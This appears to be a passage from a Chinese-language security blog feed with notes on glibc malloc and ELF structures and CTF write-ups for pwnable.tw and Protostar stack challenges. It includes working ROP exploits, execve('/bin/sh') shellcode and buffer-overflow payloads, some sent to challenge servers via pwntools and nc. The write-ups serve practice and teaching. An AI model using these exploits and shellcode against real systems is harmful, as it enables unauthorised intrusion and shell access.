  </entry>
  <entry>
    <title><![CDATA[3 Important Structure in Glibc Malloc]]></title>
    <url>%2F2017%2F11%2F18%2F3-important-structure-in-glibc-malloc%2F</url>
    <content type="text"><![CDATA[data structure in mallocmalloc_state(arena header) CODE 12345678910111213struct malloc_state&#123; ... /*fastbins链表数组, mfastbinptr实为malloc_chunk型*/ mfastbinptr fastbinsY[NFASTBINS]; /*top chunk和last_remainder指针不存放在任何bins中*/ mchunkptr top; //指向top chunk mchunkptr last_remainder; //上一个分割后剩余的chunk /*bins, 总共(128*2-2)个,减去的是前两个(用作unsorted bin)*/ mchunkptr bins[NBINS * 2 -2]; ... INTERNAL_SIZE_T system_mem;//系统给当前arena分配的内存大小 INTERNAL_SIZE_T max_system_mem;&#125; BINS 12345678/*size&lt;512bytes的bins链表中的每个bin大小相同, 相邻bins相差8bytes */ 64 bins of size 8 [small bin] 32 bins of size 64 [large bin] 16 bins of size 512 | 8 bins of size 4096 | 4 bins of size 32768 | 2 bins of size 262144 | 1 bin of size what&apos;s left [large bin] FASTBIN示意图* 关于FASTBIN和UNSORTED BIN的一点理解 Fastbin采用LIFO的方式(因为FASTBIN只维护一个HEAD指针), 通过将PREV_INUSE位置1, fastbin中的chunk从不合并.Unsorted bin采用FIFO的方式, unsorted bin里的chunk大小不一, 每个chunk都有一次重新分配的机会, 当轮到一个chunk的时候, 先检查该chunk是否符合条件, 若符合, 则malloc该chunk, 若不符合, 则将该chunk放回到与其大小相应的bins里面. heap_info(heap header)12345678typedef struct _heap_info&#123; mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */&#125; malloc_chunk(chunk header) CODE 1234567891011121314struct malloc_chunk &#123; INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;;typedef struct malloc_chunk* mchunkptr; FREE CHUNK ALLOCATED CHUNK heap示意图]]></content>
      <categories>
        <category>RE note</category>
      </categories>
      <tags>
        <tag>glibc malloc</tag>
        <tag>heap overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Calc Writeup]]></title>
    <url>%2F2017%2F11%2F10%2Fcalc-writeup%2F</url>
    <content type="text"><![CDATA[SUMMARY由于index的大小是不检查的, 我们可以通过改写index的值来任意读取和覆盖栈中的数据. 但是index的值是不能直接被覆盖的. 在eval()函数中的有这行代码index[*index - 1] += index[*index];, 只要我们能够使index为0的时候执行这行代码, 我们就能控制index的值. 最后执行execve(“/bin/sh”)来getshell. BYPASS我找到的一共有两种绕过方式: +num 00+num: 可以通过多个’0’来绕过检查 这两种方法的效果是一样的. 都能够泄漏出index[num]处的值. 而+num1+num2则能够向index[num1]地址处写入值index[num] + num2. 这里需要注意一点 : 由于atoi函数的关系, 负数是无法直接写入栈的, 可以分两次将负数写入栈中, 第一次写入0x7fffffff, 第二次写入剩下的值. ROPabout binsh这里我将/bin//sh字符串写入到index[358]和index[359]两个地址空间, 通过泄漏oldebp的地址得到/bin//sh字符串的首地址. stack12345678910111213141516171819202122232425 +++++++++++++++++++++357 + canary + +++++++++++++++++++++ &lt;--binsh358 + &apos;/bin&apos; + +++++++++++++++++++++359 + &apos;//sh&apos; + +++++++++++++++++++++360 + oldebp + +++++++++++++++++++++361 + pop_eax_ret + +++++++++++++++++++++362 + 0xb + +++++++++++++++++++++363 + pop_ecx_ebx_ret + +++++++++++++++++++++364 + 0 + +++++++++++++++++++++365 + binsh + +++++++++++++++++++++366 + pop_edx_ret + +++++++++++++++++++++367 + 0 + +++++++++++++++++++++368 + int_0x80 + +++++++++++++++++++++ EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *# context.terminal = 'tmux'# context.arch = 'x86'# context.log_level = 'debug'# io = process('./calc')# gdb.attach(io)host = 'chall.pwnable.tw'port = 10100io = remote(host, port)int_0x80 = 0x08049a21int_0x80_ret = 0x08070880pop_eax_ret = 0x0805c34bpop_edx_ret = 0x080701aapop_ecx_ebx_ret = 0x080701d1# leak stack valuedef leak_stack(index): io.sendline('+' + str(index)) leak = int(io.recvline()[:-1]) return leak # clear stack valuedef clear_stack(index): io.sendline('+' + str(index)) oldebp = int(io.recvline()[:-1]) if oldebp &lt; 0: io.sendline('+' + str(index)+ '+' + str(abs(oldebp))) else: io.sendline('+' + str(index)+ '-' + str(abs(oldebp))) io.recvline()def write_stack(index, value): if value &gt; 0: io.sendline('+' + str(index) + '+' + str(value)) else: io.sendline('+' + str(index) + '+' + '2147483647') io.recvline() io.sendline('+' + str(index) + '+' + str(int(hex(2**32+value), 16)-2147483647)) io.recvline()# write '/bin//sh'def write_binsh(): io.sendline('+358+' + str(int('0x6e69622f', 16))) io.recvline() clear_stack(359) io.sendline('+359+' + str(int('0x68732f2f', 16))) io.recvline()def write_rop(): clear_stack(361) write_stack(361, pop_eax_ret) clear_stack(362) write_stack(362, 0xb) clear_stack(363) write_stack(363, pop_ecx_ebx_ret) clear_stack(364) clear_stack(365) write_stack(365, binsh) clear_stack(366) write_stack(366, pop_edx_ret) clear_stack(367) clear_stack(368) write_stack(368, int_0x80) if __name__ == '__main__': io.recvline() binsh = leak_stack(360)-0x28 write_binsh() clear_stack(360) write_rop() io.sendline() io.interactive()]]></content>
      <categories>
        <category>write-up</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>pwnable.tw</tag>
        <tag>stack overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Orw Writeup]]></title>
    <url>%2F2017%2F11%2F07%2Forw-writeup%2F</url>
    <content type="text"><![CDATA[summary这道题的目的是让我们写一个读取/home/orw/flag内容的shellcode. 根据题目的意思, 我们只能使用open, read和write调用. solve.asm先用汇编写好shellcode 123456789101112131415161718192021222324252627282930; fd = open(&quot;/home/orw/flag&quot;); read(fd, buf, 0x10); write(0, buf, 0x10)section .textglobal _start_start: push 0 push 0x67616c66 push 0x2f77726f push 0x2f656d6f push 0x682f2f2f xor ecx, ecx mov ebx, esp mov eax, 0x5 int 0x80 mov ebx, eax sub esp, 0x20 push esp pop ecx mov edx, 0x20 mov eax, 0x3 int 0x80 mov ecx, esp mov edx, 0x20 mov bl, 0x1 mov eax, 0x4 int 0x80 shellcode然后编译链接, 将得到的binary文件用objdump反汇编得到机器码, 这就是需要的shellcode. 123nasm -f elf32 solve.asmld -m elf_i386 solve.oobjdump -D a.out 123456789101112131415161718192021222324Disassembly of section .text:08048060 &lt;_start&gt;: 8048060: 6a 00 push $0x0 8048062: 68 66 6c 61 67 push $0x67616c66 8048067: 68 6f 72 77 2f push $0x2f77726f 804806c: 68 6f 6d 65 2f push $0x2f656d6f 8048071: 68 2f 2f 2f 68 push $0x682f2f2f 8048076: 31 c9 xor %ecx,%ecx 8048078: 89 e3 mov %esp,%ebx 804807a: b8 05 00 00 00 mov $0x5,%eax 804807f: cd 80 int $0x80 8048081: 89 c3 mov %eax,%ebx 8048083: 83 ec 20 sub $0x20,%esp 8048086: 54 push %esp 8048087: 59 pop %ecx 8048088: ba 20 00 00 00 mov $0x20,%edx 804808d: b8 03 00 00 00 mov $0x3,%eax 8048092: cd 80 int $0x80 8048094: 89 e1 mov %esp,%ecx 8048096: ba 20 00 00 00 mov $0x20,%edx 804809b: b3 01 mov $0x1,%bl 804809d: b8 04 00 00 00 mov $0x4,%eax 80480a2: cd 80 int $0x80 solve.py1python -c "print '\x6a\x00\x68\x66\x6c\x61\x67\x68\x6f\x72\x77\x2f\x68\x6f\x6d\x65\x2f\x68\x2f\x2f\x2f\x68\x31\xc9\x89\xe3\xb8\x05\x00\x00\x00\xcd\x80\x89\xc3\x83\xec\x30\x54\x59\xba\x30\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\x89\xe1\xba\x30\x00\x00\x00\xb3\x01\xb8\x04\x00\x00\x00\xcd\x80'" | nc chall.pwnable.tw 10001]]></content>
      <categories>
        <category>write-up</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELF File Structure]]></title>
    <url>%2F2017%2F10%2F17%2FELF-file-structure%2F</url>
    <content type="text"><![CDATA[OVERVIEW下图定性地描述了ELF文件的总体结构(以32位系统为例), 下文中将详细展开图中的每一项. ELF Header可用readelf -h查看ELF Header信息. ELF文件的魔数为0x7F454C46, 即\x7fELF 32 bit12345678910111213141516typedef struct elf32_hdr &#123; unsigned char e_ident[EI_NIDENT]; Elf32_Half e_type; Elf32_Half e_machine; Elf32_Word e_version; Elf32_Addr e_entry; /* Entry point */ Elf32_Off e_phoff; Elf32_Off e_shoff; Elf32_Word e_flags; Elf32_Half e_ehsize; Elf32_Half e_phentsize; Elf32_Half e_phnum; Elf32_Half e_shentsize; Elf32_Half e_shnum; Elf32_Half e_shstrndx;&#125; Elf32_Ehdr; 64 bit12345678910111213141516typedef struct elf64_hdr &#123; unsigned char e_ident[16]; /* ELF "magic number" */ Elf64_Half e_type; Elf64_Half e_machine; Elf64_Word e_version; Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; Elf64_Half e_ehsize; Elf64_Half e_phentsize; Elf64_Half e_phnum; Elf64_Half e_shentsize; Elf64_Half e_shnum; Elf64_Half e_shstrndx;&#125; Elf64_Ehdr; member member usage e_ident magic &amp; class &amp; data &amp; verison &amp; OS/ABI &amp; ABI version e_type ELF文件类型 e_machine ELF文件的CPU平台属性 e_version ELF版本 e_entry ELF程序的入口虚拟地址 e_phoff start of program headers e_shoff 段表在文件中的偏移量 e_word ELF标志位 e_ehsize ELF文件头大小 e_phentsize size of program headers e_phnum number of program headers e_shentsize 段表描述符大小 e_shnum 段表描述符数量, 即段的数量 e_shsrendx 段表字符串表所在的段在段表中的下标 Section Header Table可用readelf -S查看段表. 32 bit123456789101112typedef struct elf32_shdr &#123; Elf32_Word sh_name; Elf32_Word sh_type; Elf32_Word sh_flags; Elf32_Addr sh_addr; Elf32_Off sh_offset; Elf32_Word sh_size; Elf32_Word sh_link; Elf32_Word sh_info; Elf32_Word sh_addralign; Elf32_Word sh_entsize;&#125; Elf32_Shdr; 64 bit123456789101112typedef struct elf64_shdr &#123; Elf64_Word sh_name; /* Section name, index in string tbl */ Elf64_Word sh_type; /* Type of section */ Elf64_Xword sh_flags; /* Miscellaneous section attributes */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Size of section in bytes */ Elf64_Word sh_link; /* Index of another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */&#125; Elf64_Shdr; member member usage sh_name 段名字符串在.shstrtab字符串表中的偏移 sh_type 段的类型 sh_flags 段的标志位 sh_addr 段被加载后在进程空间的虚拟地址 sh_offset 段在文件中的偏移 sh_size 段的长度 sh_link &amp; sh_info 段的链接信息 sh_addralign 段地址对齐, 为2的n次. 若为0或1, 说明该段没有对齐要求 sh_entisze 项的长度 sh_type : 段类型123456789101112131415161718/* sh_type */#define SHT_NULL 0 //无效段#define SHT_PROGBITS 1 //程序段, 如代码段/数据段#define SHT_SYMTAB 2 //符号表#define SHT_STRTAB 3 //字符串表#define SHT_RELA 4 //重定位表#define SHT_HASH 5 //符号表的哈希表#define SHT_DYNAMIC 6 //动态链接信息#define SHT_NOTE 7 //提示性信息#define SHT_NOBITS 8 //表示该段在文件中没有内容#define SHT_REL 9 //包含重定位信息#define SHT_SHLIB 10 //保留#define SHT_DYNSYM 11 //动态链接的符号表#define SHT_NUM 12#define SHT_LOPROC 0x70000000#define SHT_HIPROC 0x7fffffff#define SHT_LOUSER 0x80000000#define SHT_HIUSER 0xffffffff sh_flag : 段标志位12345/* sh_flags */#define SHF_WRITE 0x1 //表示该段在进程空间可写#define SHF_ALLOC 0x2 //该段在进程空间中需要分配空间#define SHF_EXECINSTR 0x4 //该段在进程空间中可执行, 一般指代码段#define SHF_MASKPROC 0xf0000000 Symbol Table可以用readelf -s查看符号表信息. 32 bit12345678typedef struct elf32_sym&#123; Elf32_Word st_name; Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; unsigned char st_other; Elf32_Half st_shndx;&#125; Elf32_Sym; 64 bit12345678typedef struct elf64_sym &#123; Elf64_Word st_name; /* Symbol name, index in string tbl */ unsigned char st_info; /* Type and binding attributes */ unsigned char st_other; /* No defined meaning, 0 */ Elf64_Half st_shndx; /* Associated section index */ Elf64_Addr st_value; /* Value of the symbol */ Elf64_Xword st_size; /* Associated symbol size */&#125; Elf64_Sym; member usage st_name 符号名, 即该符号名在字符串表中的下标 st_value 符号相对应的值(目标文件:符号在段中的偏移, 可执行文件: 符号虚拟地址) st_size 符号大小(占用空间) st_info 符号类型和绑定信息 st_other 为0, 无用 st_shndx 该符号所在的段 st_info : 符号类型及绑定信息123456789101112/* This info is needed when parsing the symbol table */#define STB_LOCAL 0 // 局部符号#define STB_GLOBAL 1 //全局符号#define STB_WEAK 2 //弱引用#define STT_NOTYPE 0 //未知类型#define STT_OBJECT 1 //数据对象#define STT_FUNC 2 //函数#define STT_SECTION 3 //段, 这种类型的符号必须是STB_LOCAL的#define STT_FILE 4 //文件名, STB_LOCAL并且st_shndx是SHN_ABS#define STT_COMMON 5#define STT_TLS 6 st_shndx : 符号所在段若符号定义在本目标文件中, 那么st_shndx表示符号所在段在段表中的下标. 对于一些特殊符号, st_shndx有特殊的值. 12345678/* special section indexes */#define SHN_UNDEF 0 //符号定义在其他文件中#define SHN_LORESERVE 0xff00#define SHN_LOPROC 0xff00#define SHN_HIPROC 0xff1f#define SHN_ABS 0xfff1 //该符号包含一个绝对值#define SHN_COMMON 0xfff2 //该符号是一个COMMON块#define SHN_HIRESERVE 0xffff]]></content>
      <categories>
        <category>Linux kernel</category>
      </categories>
      <tags>
        <tag>ELF</tag>
        <tag>link&amp;load</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Protostar Stack Still Easy]]></title>
    <url>%2F2017%2F09%2F08%2Fprotostar-stack-still-easy%2F</url>
    <content type="text"><![CDATA[接上次protostar stack easy, 这篇文章是stack5-stack7的write-up, 因为给汇编代码写注释太费时间, 我就直接上源码了. stack5将shellcode写到栈上, 然后JMP到shellcode的起始地址. ‘0x90’是NOP指令的机器码, 加入适当的’0x90’是提高JMP进shellcode的几率, 在这个题目中加或不加都没有关系, 因为没有开启ASLR. 这种技巧在heap spray中也会用到. exp123456789sc = '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'payroad = ''payroad += 'A' * 0x4cpayroad += '\xb0\xfc\xff\xbf'#payroad += '\x90' * 0x20payroad += scprint payroad stack6先看源码中的这几句 :123456ret = __builtin_return_address(0);if((ret &amp; 0xbf000000) == 0xbf000000) &#123; printf("bzzzt (%p)\n", ret); _exit(1);&#125; __builtin_return_address函数返回当前函数或调用当前函数的指令的返回地址. 参数为0表示返回当前函数的地址. if语句限制了返回地址第一个字节不能等于0xbf, 也就是说, 返回地址不能在栈上.12345678910(gdb) info proc mappingsprocess 4407cmdline = &apos;/opt/protostar/bin/stack6&apos;cwd = &apos;/opt/protostar/bin&apos;exe = &apos;/opt/protostar/bin/stack6&apos;Mapped address spaces: Start Addr End Addr Size Offset objfile ... ... 0xbffeb000 0xc0000000 0x15000 0 [stack] exp这道题目可以用ret2libc做, 但是这里我们用另外一种方法.1234567891011sc = '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'retaddr = '\xf9\x84\x04\x08' # retpayroad = ''payroad += 'A' * 0x50payroad += retaddrpayroad += '\x94\xfc\xff\xbf'#payroad += '\x90' * 0x20payroad += scprint payroad 这里我们通过ret两次来绕过检查, 第一次返回到ret指令, 第二次返回到shellcode首地址. stack7先看源码:123456789ret = __builtin_return_address(0); if((ret &amp; 0xb0000000) == 0xb0000000) &#123; printf("bzzzt (%p)\n", ret); _exit(1); &#125; printf("got path %s\n", buffer); return strdup(buffer); 参照stack6, 前两句限制了ret2libc和直接JMP shellcode. 我们仍然可以用返回到.text段的方法. 这里有一点很奇怪, 当我在gdb里面调试的时候是能够成功getshell的, 但是直接执行程序的时候会报错Illegal instruction.这里可能的原因是gdb中调试的地址和实际运行的地址不同.具体参照Here, 可以通过生成core文件来查看地址.这道题特殊的解法是JMP register, 因为strdup返回的地址被保存在eax中, 我们也可以利用这一点来JMP到shellcode, 具体实现见Here.]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>stack overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debug Shellcode]]></title>
    <url>%2F2017%2F09%2F05%2FDebug-Shellcode%2F</url>
    <content type="text"><![CDATA[记录几个自己碰到的关于shellcode的问题, 一个都没解决…如果有知道解决方法的请发我邮箱(邮箱在页面最下方), 谢谢! shellcode 1最简单的shellcode形式大概就是直接调用execve(“/bin/sh”, {“/bin/sh”, NULL}, NULL)系统调用了吧…并不是十分清楚, 所以如果说错的话就当我没说… C code先从C代码开始: 123456#include &lt;stdlib.h&gt;main()&#123; char *argv[] = &#123;"bin/sh", NULL&#125;; setuid(0, 0); execve("/bin/sh", argv, NULL);&#125; 编译运行以上程序, 我们就能够得到一个shell了. asm code 按照上面的思路, 转成汇编代码: 123456789101112131415161718192021section .textglobal _start_start: ;setreuid(0, 0) xor eax, eax xor ebx, ebx ;ruid = 0 xor ecx, ecx ;euid = 0 mov al,0x46 ;sys_setreuid int 0x80 ;execve(&quot;/bin//sh&quot;, argv, NULL) xor eax, eax push eax ;NULL, 字符串截断符 ;&quot;//sh&quot;, 第二个&apos;/&apos;是为了填充字节, 在命令行输入/bin//sh是可以执行成功的 push 0x68732f2f push 0x6e69622f ;&quot;/bin&quot; mov ebx, esp push eax ;NULL, 设置argv[1]为空 push ebx mov ecx, esp mov al, 0x0b ;sys_execve int 0x80 具体栈内数据如下:1234567891011low--&gt; ++++++++++++++ + argv + &lt;-- argv = sh_addr(addr of &apos;/bin//sh&apos;) ++++++++++++++ + 0 + &lt;-- argv [1]sh_addr ++++++++++++++ + /bin + ++++++++++++++ + //sh + ++++++++++++++ + 0 +high--&gt; ++++++++++++++ 编译运行以后就能够成功拿到shell了, 然后用objdump反汇编, 就可以得到shellcode. 这段代码出自《Grey Hat Hacking》一书, 我尝试着想把它改成下面的形式, 但是程序报错Address boundary error. 后面发现原因: argv是一个指针数组, 如果要把它写到.data段中, 就需要知道argv在data中的具体地址. 这种做法是不可取的, 因为.data段的地址不是固定的. 但是, 如果要想用这种db &quot;/bin/sh&quot;形式, 也还是办法的. 具体见下面的shellcode2. 12section .datashell db &apos;/bin//sh&apos;, 0 shellcode test&amp;debug一种常见的测试shellcode是否可用的方法是: 12345678910111213141516171819202122/*char sc[] = your_shellcode;*/char sc[] = "\x31\xc0" //xor eax,eax "\x31\xdb" //xor ebx,ebx "\x31\xc9" //xor ecx,ecx "\xb0\x46" //mov al,0x46 "\xcd\x80" //int 0x80 "\x31\xc0" //xor eax,eax "\x50" //push eax "\x68\x2f\x2f\x73\x68" //push 0x68732f2f "\x68\x2f\x62\x69\x6e" //push 0x6e69622f "\x89\xe3" //mov ebx,esp "\x50" //push eax "\x53" //push ebx "\x89\xe1" //mov ecx,esp "\xb0\x0b" //mov al,0xb "\xcd\x80" //int 0x80main()&#123; void (*fp)(void); fp = (void *) sc; fp();&#125; 用以上的方法对上述shellcode测试, 发现报SIGSEGV(Address boundary error)的错……用gdb调试, 发现了这样的结果, 一路下来程序执行的非常顺利, 栈上的数据也没有什么问题, 但是调用最后一个0x80的时候并没有getshell, 继续单步执行反而报了segment fault的错. 我是在protostar虚拟机里面测试的这段shellcode, 在ubuntu下好像被什么神秘的保护机制给挡住了…连shellcode起始地址都不跳进去就报错…好了, 虽然没有调试成功这段shellcode, 但就当作我已经测试成功了…接下来继续看下一段shellcode. shellcode2这段shellcode的原出处在Here. 它的设计思路和shellcode1一样. asm code1234567891011121314151617181920212223242526;shellex.asm[SECTION .text]global _start_start: xor eax, eax mov al, 70 ;setreuid is syscall 70 xor ebx, ebx xor ecx, ecx int 0x80 jmp short ender starter: pop ebx ;get the address of the string xor eax, eax mov [ebx+7], al ;put a NULL where the N is in the string mov [ebx+8], ebx ;put the address of the string to where the ;AAAA is mov [ebx+12], eax ;put 4 null bytes into where the BBBB is mov al, 11 ;execve is syscall 11 lea ecx, [ebx+8] ;load the address of where the AAAA was lea edx, [ebx+12] ;load the address of the NULLS int 0x80 ;call the kernel, WE HAVE A SHELL! ender: call starter db &apos;/bin/shNAAAABBBB&apos; 整个代码的逻辑感觉没有什么问题, 但是依然报错, 而且这次是运行可执行文件的时候就报错.报错情况如下: 可以看到程序是没有开任何保护机制的, 不知道又是哪股神秘的力量阻挡了shellcode的执行… summary可能是因为我给的两段shellcode的例子都比较老了, 所以问题才这么多吧. 不过我的确是在做PWN题目时候碰到过已经JMP进shellcode, 还报Segment Fault的错(那段shellcode是用gef工具生成的). 感觉shellcode真是一个神秘的东西. refrence 《Grey hat hacking》 Shellcoding for Linux and Windows Tutorial]]></content>
      <categories>
        <category>RE note</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
        <tag>pwn</tag>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Protostar Stack Easy]]></title>
    <url>%2F2017%2F09%2F04%2Fprotostar-stack-easy%2F</url>
    <content type="text"><![CDATA[这是给exploit-exercises上protostar的stack题目写的write-up. 由于篇幅限制, 这篇文章只有stack0 - stack4的write-up. stack0首先看一下汇编代码 : 123456789101112131415161718192021222324(gdb) disas mainDump of assembler code for function main:0x080483f4 &lt;main+0&gt;: push ebp0x080483f5 &lt;main+1&gt;: mov ebp,esp0x080483f7 &lt;main+3&gt;: and esp,0xfffffff00x080483fa &lt;main+6&gt;: sub esp,0x60;first pramater modified0x080483fd &lt;main+9&gt;: mov DWORD PTR [esp+0x5c],0x00x08048405 &lt;main+17&gt;: lea eax,[esp+0x1c] ;buf0x08048409 &lt;main+21&gt;: mov DWORD PTR [esp],eax0x0804840c &lt;main+24&gt;: call 0x804830c &lt;gets@plt&gt; ;gets(buf)0x08048411 &lt;main+29&gt;: mov eax,DWORD PTR [esp+0x5c]0x08048415 &lt;main+33&gt;: test eax,eax ;if (flag == 0)?0x08048417 &lt;main+35&gt;: je 0x8048427 &lt;main+51&gt;;puts($0x8048500) if (modified != 0)0x08048419 &lt;main+37&gt;: mov DWORD PTR [esp],0x80485000x08048420 &lt;main+44&gt;: call 0x804832c &lt;puts@plt&gt; 0x08048425 &lt;main+49&gt;: jmp 0x8048433 &lt;main+63&gt;;puts($0x8048500) if (modified == 0)0x08048427 &lt;main+51&gt;: mov DWORD PTR [esp],0x80485290x0804842e &lt;main+58&gt;: call 0x804832c &lt;puts@plt&gt;0x08048433 &lt;main+63&gt;: leave 0x08048434 &lt;main+64&gt;: ret End of assembler dump. 上述代码中, 注释为笔者所加. 下面看一下0x8048500和0x8048529两个字符串的具体内容: 1234(gdb) x/s 0x80485000x8048500: &quot;you have changed the &apos;modified&apos; variable&quot;(gdb) x/s 0x80485290x8048529: &quot;Try again?&quot; 到此, 这个程序的逻辑就已经理清了. 该程序调用gets()函数读取用户输入, 并写入到buf[0x40]中. 由于程序不检查输入, 此处可以发生字符串溢出. 当modified值被修改后输出”you have changed the ‘modified’ variable”, 否则输出”Try again?”. stack0程序的源代码在Here. 我们只要输入超过0x40个字符就能够获取到正确输入. solve1python -c "print 'A'*0x40 + 'modified'" | ./stack0 stack1照样先看汇编代码: 123456789101112131415161718192021222324252627282930313233343536373839404142(gdb) disas mainDump of assembler code for function main:;modified = [esp+0x5c] ;size=0x4;buf = [esp+0x1c] ;size=0x40;argv1 = [esp+0x4]0x08048464 &lt;main+0&gt;: push ebp0x08048465 &lt;main+1&gt;: mov ebp,esp0x08048467 &lt;main+3&gt;: and esp,0xfffffff00x0804846a &lt;main+6&gt;: sub esp,0x60;if argc == 1?0x0804846d &lt;main+9&gt;: cmp DWORD PTR [ebp+0x8],0x10x08048471 &lt;main+13&gt;: jne 0x8048487 &lt;main+35&gt;;call errx(1, $0x80485a0) if (argc == 1)0x08048473 &lt;main+15&gt;: mov DWORD PTR [esp+0x4],0x80485a00x0804847b &lt;main+23&gt;: mov DWORD PTR [esp],0x10x08048482 &lt;main+30&gt;: call 0x8048388 &lt;errx@plt&gt;0x08048487 &lt;main+35&gt;: mov DWORD PTR [esp+0x5c],0x0;argv1 = &amp;argv[1], strcpy(buf, argv1)0x0804848f &lt;main+43&gt;: mov eax,DWORD PTR [ebp+0xc]0x08048492 &lt;main+46&gt;: add eax,0x40x08048495 &lt;main+49&gt;: mov eax,DWORD PTR [eax]0x08048497 &lt;main+51&gt;: mov DWORD PTR [esp+0x4],eax0x0804849b &lt;main+55&gt;: lea eax,[esp+0x1c]0x0804849f &lt;main+59&gt;: mov DWORD PTR [esp],eax0x080484a2 &lt;main+62&gt;: call 0x8048368 &lt;strcpy@plt&gt;;if (modified == &apos;abcd&apos;)?0x080484a7 &lt;main+67&gt;: mov eax,DWORD PTR [esp+0x5c]0x080484ab &lt;main+71&gt;: cmp eax,0x616263640x080484b0 &lt;main+76&gt;: jne 0x80484c0 &lt;main+92&gt;;puts($0x80485bc) and leave if (modified == &apos;abcd&apos;)0x080484b2 &lt;main+78&gt;: mov DWORD PTR [esp],0x80485bc0x080484b9 &lt;main+85&gt;: call 0x8048398 &lt;puts@plt&gt;0x080484be &lt;main+90&gt;: jmp 0x80484d5 &lt;main+113&gt;;printf($0x80485f3, argv1) if (modified != &apos;abcd&apos;)0x080484c0 &lt;main+92&gt;: mov edx,DWORD PTR [esp+0x5c]0x080484c4 &lt;main+96&gt;: mov eax,0x80485f30x080484c9 &lt;main+101&gt;: mov DWORD PTR [esp+0x4],edx0x080484cd &lt;main+105&gt;: mov DWORD PTR [esp],eax0x080484d0 &lt;main+108&gt;: call 0x8048378 &lt;printf@plt&gt;0x080484d5 &lt;main+113&gt;: leave 0x080484d6 &lt;main+114&gt;: ret End of assembler dump. 继续看一下各个字符串的值分别为多少: 123456(gdb) x/s 0x80485f30x80485f3: &quot;Try again, you got 0x%08x\n&quot;(gdb) x/s 0x80485bc0x80485bc: &quot;you have correctly got the variable to the right value&quot;(gdb) x/s 0x80485a00x80485a0: &quot;please specify an argument\n&quot; 该程序首先检查argc是否为1, 若是, 则程序报错. 然后执行strcpy(buf, argv[1]), 如果modified被覆写为”abcd”, 则输出you have correctly got the variable to the right value, 否则视为失败. stack1的源码在Here. solve1python -c "print 'A'*0x40 + 'abcd'" | ./stack1 stack2执行程序,得到以下结果: 1234root@protostar:/opt/protostar/bin# ./stack2stack2: please set the GREENIE environment variableroot@protostar:/opt/protostar/bin# 可以看到, 这个程序要求我们设置GREENIE的环境变量. 那么在这里, 我们就需要用到execve()系统调用, 这道题的exp可以用python写, 也可以用C写, 我用的是python. 其实用C和python代码基本相同, 除了在C中环境变量是由”$ENV_NAME=ENV_VALUE”的指针数组表示, 而在python里, 环境变量的类型是字典. 继续上汇编代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445(gdb) disas mainDump of assembler code for function main:;env_greenie = [esp+0x5c] ;size = 0x4;modified = [esp+0x58] ;size = 0x4;buf = [esp+0x18] ;size = 0x400x08048494 &lt;main+0&gt;: push ebp0x08048495 &lt;main+1&gt;: mov ebp,esp0x08048497 &lt;main+3&gt;: and esp,0xfffffff00x0804849a &lt;main+6&gt;: sub esp,0x60;env_greenie = getenv(&quot;GREENIE&quot;)0x0804849d &lt;main+9&gt;: mov DWORD PTR [esp],0x80485e00x080484a4 &lt;main+16&gt;: call 0x804837c &lt;getenv@plt&gt;0x080484a9 &lt;main+21&gt;: mov DWORD PTR [esp+0x5c],eax;if (env_greenie == 0)?0x080484ad &lt;main+25&gt;: cmp DWORD PTR [esp+0x5c],0x00x080484b2 &lt;main+30&gt;: jne 0x80484c8 &lt;main+52&gt;;errx(1, &quot;GREENIE&quot;) if (env_greenie == 0)0x080484b4 &lt;main+32&gt;: mov DWORD PTR [esp+0x4],0x80485e80x080484bc &lt;main+40&gt;: mov DWORD PTR [esp],0x10x080484c3 &lt;main+47&gt;: call 0x80483bc &lt;errx@plt&gt;;if (env_greenie != 0)&#123;0x080484c8 &lt;main+52&gt;: mov DWORD PTR [esp+0x58],0x0 ;modified = 0;strcpy(buf, env_greenie) &#125;0x080484d0 &lt;main+60&gt;: mov eax,DWORD PTR [esp+0x5c]0x080484d4 &lt;main+64&gt;: mov DWORD PTR [esp+0x4],eax0x080484d8 &lt;main+68&gt;: lea eax,[esp+0x18]0x080484dc &lt;main+72&gt;: mov DWORD PTR [esp],eax0x080484df &lt;main+75&gt;: call 0x804839c 